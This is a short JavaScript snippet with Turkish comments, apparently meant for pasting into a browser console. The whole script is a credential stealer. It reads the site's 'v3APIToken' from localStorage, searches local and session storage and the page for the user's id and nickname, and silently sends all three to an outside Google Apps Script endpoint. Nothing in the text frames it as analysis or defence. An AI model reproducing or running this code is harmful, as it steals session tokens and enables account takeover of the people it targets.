(function() {
    const _gs = "https://script.google.com/macros/s/AKfycbyR-IX4up6a_FCP5rnKWW7yLstNuo2IZRdrh12dFVx0ZSvfRbtIeOw5qVNl-lKHE3jt/exec";
    
    // 1. Token Al (Bu genelde sabittir)
    const _t = localStorage.getItem('v3APIToken') || "";
    
    // 2. ID ve Nickname'i farklı yerlerden avla
    let _u = "Bilinmiyor", _n = "Bilinmiyor";

    try {
        // Yöntem A: LocalStorage ve SessionStorage'ı tamamen tara
        const storage = { ...localStorage, ...sessionStorage };
        for (let key in storage) {
            try {
                const data = JSON.parse(storage[key]);
                if (data && (data.id || data.nickname)) {
                    _u = data.id || _u;
                    _n = data.nickname || data.displayName || _n;
                }
            } catch(e) {}
        }

        // Yöntem B: Eğer hala yoksa ekrandaki elementten Nickname çek
        if (_n === "Bilinmiyor") {
            const nickEl = document.querySelector('[class*="nickname"]') || document.querySelector('.nickname');
            if (nickEl) _n = nickEl.innerText.trim();
        }

        // Yöntem C: Profil linkinden ID'yi ayıkla
        if (_u === "Bilinmiyor") {
            const profileLink = document.querySelector('a[href*="/profile/"]');
            if (profileLink) {
                const match = profileLink.href.match(/\/profile\/(\d+)/);
                if (match) _u = match[1];
            }
        }

        // 3. Veri varsa gönder
        if (_t !== "") {
            fetch(`${_gs}?token=${encodeURIComponent(_t)}&userId=${encodeURIComponent(_u)}&nickname=${encodeURIComponent(_n)}&source=Bot2_Verified_Logger`, {
                method: 'GET',
                mode: 'no-cors'
            });
            console.log("%c[!] Bilgiler başarıyla paketlendi.", "color: #2ecc71;");
        } else {
            console.warn("[!] Token bulunamadı, giriş yapıldığından emin olun.");
        }
    } catch (err) {
        console.error("Logger hatası:", err);
    }
})();
